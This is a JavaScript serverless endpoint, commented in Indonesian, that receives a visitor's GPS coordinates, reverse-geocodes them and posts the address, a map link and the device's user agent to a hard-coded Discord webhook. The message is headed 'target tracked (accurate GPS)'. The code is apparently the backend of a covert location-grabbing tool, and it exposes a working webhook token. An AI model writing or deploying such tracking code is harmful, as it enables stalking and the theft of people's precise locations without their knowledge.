export default async function handler(req, res) {
    if (req.method === 'POST') {
        try {
            // 1. Tangani body agar aman dibaca (parse jika masih berupa string/buffer)
            let bodyData = req.body;
            if (typeof bodyData === 'string') {
                bodyData = JSON.parse(bodyData);
            }
            
            const { lat, lon } = bodyData || {};
            const userAgent = req.headers['user-agent'] || 'Unknown';

            if (!lat || !lon) {
                return res.status(400).json({ error: 'Koordinat tidak ditemukan' });
            }

            // 2. Ambil nama alamat menggunakan Nominatim dengan menyertakan User-Agent khusus
            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`, {
                headers: {
                    'User-Agent': 'IP-Tracker-App/1.0 (contact@example.com)'
                }
            });
            const geoData = await geoRes.json();
            const address = geoData.display_name || 'Tidak diketahui';

            // 3. Webhook Discord Anda
            const discordWebhookUrl = "https://discord.com/api/webhooks/1563198219284906116/bTgAtzBPWpJ3T8laDTu-SUC0pppBkUV7ceFDUHedGpo74toylxKkkwFCKPk6czvT8HXA";

            if (discordWebhookUrl) {
                const message = {
                    content: `🎯 **TARGET TERLACAK (GPS AKURAT)!** 🎯\n` +
                             `📍 **Alamat:** ${address}\n` +
                             `🌐 **Koordinat:** [Google Maps](https://www.google.com/maps?q=${lat},${lon})\n` +
                             `💻 **Perangkat:** ${userAgent}`
                };

                await fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(message)
                });
            }

            return res.status(200).json({ success: true });
        } catch (error) {
            console.error("Gagal memproses lokasi:", error);
            return res.status(500).json({ error: error.message });
        }
    }
    
    res.setHeader('Allow', ['POST']);
    res.status(405).json({ error: `Method ${req.method} Not Allowed` });
}